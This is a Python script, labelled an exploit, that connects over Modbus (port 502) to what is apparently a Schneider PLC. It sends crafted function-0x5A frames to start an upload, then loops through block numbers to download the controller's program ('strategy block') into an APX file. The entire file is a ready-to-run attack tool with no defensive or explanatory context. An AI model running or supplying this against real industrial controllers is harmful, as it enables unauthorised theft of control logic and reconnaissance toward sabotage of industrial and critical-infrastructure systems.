#!/usr/bin/env python3

__author__ = "Yanis Wang"
__email__ = "mryaniswang@gmail.com"

import argparse
import socket


def exploit(host: str, port: int, output: str):
    print("[*] Connecting to target")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    print("[+] Connection established")
    print("[*] Initializing upload")

    data = b"\xff\xff\x00\x00\x00\x08\x01\x5a\x00\x33\x00\x01\xfb\x03"
    sock.send(data)
    response = sock.recv(1024)

    if response[9] != 0xfe:
        print("[-] Failed to initialize upload")
        exit(-1)

    print("[*] Uploading strategy block")

    strategy = b""

    for i in range(0xffff):
        print(f"[*] Uploading block 0x{i:04x}", end="\r")

        block_number = i.to_bytes(2, "little")
        data = b"\xff\xff\x00\x00\x00\x08\x01\x5a\x00\x34\x00\x01" + block_number
        sock.send(data)
        response = sock.recv(2048)

        if response[9] != 0xfe:
            print("[-] Failed to upload strategy block")
            exit(-1)
        elif response[12:14] == b"\x00\x00":
            print("[+] Strategy block uploaded")
            break

        strategy += response[14:]

    with open(output, "wb") as f: 
        f.write(strategy)

    print("[+] Done")

 
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True, type=str, default=None, help="Target address")
    parser.add_argument("--port", required=False, type=int, default=502, help="Target port")
    parser.add_argument("--output", required=False, type=str, default="PLC.apx", help="Output APX file")
    args = parser.parse_args()

    exploit(args.host, args.port, args.output)

 
if __name__ == "__main__":
    main()
